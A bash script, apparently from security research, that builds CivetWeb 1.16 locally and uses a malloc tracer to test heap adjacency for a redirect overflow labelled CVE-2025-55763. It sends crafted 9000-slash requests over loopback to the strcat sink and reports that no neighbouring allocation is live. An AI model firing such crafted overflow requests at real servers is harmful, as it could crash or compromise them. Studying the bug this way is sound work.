#!/bin/bash
# CivetWeb CVE-2025-55763 — offline, loopback-only NATURAL-ADJACENCY probe.
# Usage: bash run-natural.sh [OUTDIR]
#
# Builds the UNMODIFIED pinned v1.16 with FORTIFY off. An observation-only
# LD_PRELOAD tracer logs malloc/free addresses (it calls __libc_malloc etc.
# directly, so it does not recurse or change the allocator). After a benign
# warm redirect and crafted redirect requests, the script checks whether any
# LIVE allocation immediately followed new_path at the moment new_path was
# allocated. This is the negative result behind the INSTRUMENTED rung-4 label:
# adjacency seen in run-rung4.sh is created by its canary patch, not by the
# unmodified request path. No sanitizer, no network beyond 127.0.0.1.
set -u

BASE="$(cd "$(dirname "$0")" && pwd)"
OUT="${1:-$BASE/out-natural}"
rm -rf "$OUT"
mkdir -p "$OUT/build" "$OUT/docroot/d"
printf 'hello\n' > "$OUT/docroot/d/index.html"
printf 'root\n' > "$OUT/docroot/index.html"

trace="$OUT/trace.txt"
: > "$trace"
pass=0; fail=0
ck() { # name expected actual
  local n="$1" e="$2" a="$3"
  if [ "$e" = "$a" ]; then printf 'PASS %s=%s\n' "$n" "$a" >> "$trace"; pass=$((pass+1));
  else printf 'FAIL %s expected=%s actual=%s\n' "$n" "$e" "$a" >> "$trace"; fail=$((fail+1)); fi
}

ck pin_v1_16 f0e471c1bf4e7804a6cfb41ea9d13e7d623b2bcc7bc1e2a4dd54951a24d60285 \
   "$(sha256sum "$BASE/pins/civetweb-1.16.tar.gz" | cut -d' ' -f1)"
if [ "$fail" -ne 0 ]; then cat "$trace"; exit 1; fi

cat > "$OUT/tracemalloc.c" <<'CSRC'
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
extern void *__libc_malloc(size_t);
extern void __libc_free(void *);
extern void *__libc_realloc(void *, size_t);
extern void *__libc_calloc(size_t, size_t);
static int logfd = -1;
static __thread int busy;
static void logev(char tag, void *p, size_t n)
{
    char buf[128]; int len;
    if (busy) return;
    busy = 1;
    len = snprintf(buf, sizeof(buf), "%c %p %zu\n", tag, p, n);
    if (logfd >= 0 && len > 0) (void)write(logfd, buf, (size_t)len);
    busy = 0;
}
void *malloc(size_t n) { void *p = __libc_malloc(n); logev('M', p, n); return p; }
void free(void *p) { logev('F', p, 0); __libc_free(p); }
void *realloc(void *p, size_t n) { void *q = __libc_realloc(p, n); logev('R', q, n); return q; }
void *calloc(size_t a, size_t b) { void *p = __libc_calloc(a, b); logev('C', p, a * b); return p; }
__attribute__((constructor)) static void init(void)
{
    const char *path = getenv("CW_MALLOC_LOG");
    if (path) logfd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
}
CSRC
gcc -shared -fPIC -O2 -o "$OUT/tracemalloc.so" "$OUT/tracemalloc.c" -ldl > "$OUT/tracer-build.log" 2>&1
ck tracer_build 0 "$?"

tar xzf "$BASE/pins/civetweb-1.16.tar.gz" -C "$OUT/build"
V="$OUT/build/civetweb-1.16"
(cd "$V" && make WITH_CFLAGS='-U_FORTIFY_SOURCE -O0 -g' NO_SSL=1 -j4 civetweb > "$OUT/vuln-build.log" 2>&1)
ck vuln_build 0 "$?"
ck unmodified_sink 1 "$(grep -c 'strcat(new_path, ri->query_string);' "$V/src/civetweb.c")"
ck no_canary_patch 0 "$(grep -c 'w1_victim' "$V/src/civetweb.c" || true)"

python3 - "$OUT" <<'PY'
import sys
out = sys.argv[1]
warm = b'GET /d?q=1 HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n'
open(out + '/warm.req', 'wb').write(warm)
req = 'GET ' + '/' + '/' * 9000 + 'd?q=1 HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n'
open(out + '/crafted.req', 'wb').write(req.encode())
PY
ck warm_req_bytes 59 "$(wc -c < "$OUT/warm.req")"
ck crafted_req_bytes 9059 "$(wc -c < "$OUT/crafted.req")"

PORT=18451
CW_MALLOC_LOG="$OUT/malloc.log" LD_PRELOAD="$OUT/tracemalloc.so" \
  "$V/civetweb" -listening_ports "127.0.0.1:$PORT" -document_root "$OUT/docroot" \
  -num_threads 1 -access_log_file "$OUT/access.log" -error_log_file "$OUT/error.log" \
  > "$OUT/server.out" 2>&1 &
PID=$!
for i in $(seq 1 40); do
  curl -sS -o /dev/null "http://127.0.0.1:$PORT/index.html" 2>/dev/null && break
  sleep 0.1
done
timeout 6 nc 127.0.0.1 "$PORT" < "$OUT/warm.req" > "$OUT/warm-client.out" 2>&1
sleep 0.3
for n in 1 2 3; do
  timeout 8 nc 127.0.0.1 "$PORT" < "$OUT/crafted.req" > "$OUT/crafted-$n.out" 2>&1
  sleep 0.3
done
kill "$PID" 2>/dev/null || true
wait "$PID" 2>/dev/null || true

python3 - "$OUT" "$trace" <<'PY'
import sys
out, tracefile = sys.argv[1], sys.argv[2]
ev = []
for line in open(out + '/malloc.log'):
    p = line.split()
    if len(p) != 3: continue
    try: a = 0 if p[1] == '(nil)' else int(p[1], 16)
    except ValueError: continue
    ev.append((p[0], a, int(p[2])))
live = {}
observed = []
for i, (t, a, n) in enumerate(ev):
    if t == 'M' and n in (8197, 8232):
        nb = a + ((n + 8 + 15) & ~15)
        observed.append((i, a, n, nb, nb in live, live.get(nb, 0)))
    if t in ('M', 'C', 'R'): live[a] = n
    elif t == 'F': live.pop(a, None)

np = 0; nf = 0
def record(name, expected, actual):
    global np, nf
    ok = expected == actual
    with open(tracefile, 'a') as f:
        f.write(('PASS ' if ok else 'FAIL ') + '%s=%s\n' % (name, actual))
        if not ok: f.write('  expected=%s\n' % expected)
    if ok: np += 1
    else: nf += 1

record('newpath_count', 4, len(observed))
record('newpath_sizes', '8197,8197,8197,8197', ','.join(str(x[2]) for x in observed))
record('neighbour_live_at_alloc', '0,0,0,0', ','.join('1' if x[4] else '0' for x in observed))
# The chunk at +chunksize is only allocated later, on the response path,
# i.e. AFTER the appends at :15257-:15262.
later = []
for i, a, n, nb, was_live, live_size in observed:
    later.append(any(t == 'M' and addr == nb for t, addr, sz in ev[i+1:]))
record('crafted_neighbour_allocated_later', '1,1,1', ','.join('1' if x else '0' for x in later[1:]))
with open(out + '/py-counts', 'w') as f:
    f.write('%d %d\n' % (np, nf))
for k, (i, a, n, nb, was_live, live_size) in enumerate(observed):
    print('NEWPATH%d idx=%d addr=0x%x size=%d neighbour=0x%x live_at_alloc=%d later_alloc=%d'
          % (k+1, i, a, n, nb, was_live, later[k]))
PY
read NP NF < "$OUT/py-counts"
pass=$((pass + NP))
fail=$((fail + NF))
printf 'PASS_COUNT=%d\n' "$pass" >> "$trace"
printf 'FAIL_COUNT=%d\n' "$fail" >> "$trace"
printf 'TRACE_SHA256=%s\n' "$(sha256sum "$trace" | cut -d' ' -f1)" >> "$trace"
cat "$trace"
[ "$fail" -eq 0 ]
